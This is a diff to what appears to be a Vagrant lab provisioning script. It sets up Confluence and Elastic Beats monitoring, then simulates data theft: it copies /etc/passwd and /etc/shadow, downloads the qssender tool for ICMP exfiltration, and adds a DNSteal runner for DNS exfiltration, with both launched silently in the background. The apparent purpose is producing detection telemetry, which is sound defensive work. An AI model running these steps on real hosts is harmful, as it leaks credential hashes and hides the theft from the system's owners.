@@ -5,12 +5,13 @@
 /etc/init.d/confluence start
 
 # General
-apt install rsyslog
+apt install rsyslog -y
+apt install dnsutils -y
 service rsyslog start
+apt-get install libpcap0.8 -y
 
 # [BEATS SETUP]
 # Setup packetbeat
-apt-get install libpcap0.8 -y
 curl -L -O https://artifacts.elastic.co/downloads/beats/packetbeat/packetbeat-8.3.3-amd64.deb
 dpkg -i packetbeat-8.3.3-amd64.deb
 cp /vagrant/config/packetbeat/packetbeat.yml /etc/packetbeat/packetbeat.yml
@@ -35,14 +36,21 @@ cp /vagrant/config/auditbeat/auditbeat.yml /etc/auditbeat/auditbeat.yml
 mkdir /tmp/exfiltrate
 cat /etc/passwd > /tmp/exfiltrate/passwd
 cat /etc/shadow > /tmp/exfiltrate/shadow
-# Setup qsreceiver and qssender
+# Run qssender to exfilrate via ICMP
 wget https://github.com/ariary/QueenSono/releases/latest/download/qssender -O /tmp/qssender
 chmod +x /tmp/qssender
 cp /vagrant/attack/exfiltration/run_qssender.sh /tmp/run_qssender.sh
 chmod +x /tmp/run_qssender.sh
 nohup /tmp/run_qssender.sh &>/dev/null &
+# Run DNSteal to exfiltrate via DNS
+cp /vagrant/attack/exfiltration/run_dnsteal.sh /tmp/run_dnsteal.sh
+chmod +x /tmp/run_dnsteal.sh
+nohup /tmp/run_dnsteal.sh &>/dev/null &
+
 
 # Start beats
+echo "Waiting for Kibana to be up, sleeping for 60s..."
+sleep 60
 filebeat setup -e
 packetbeat setup -e
 auditbeat setup -e
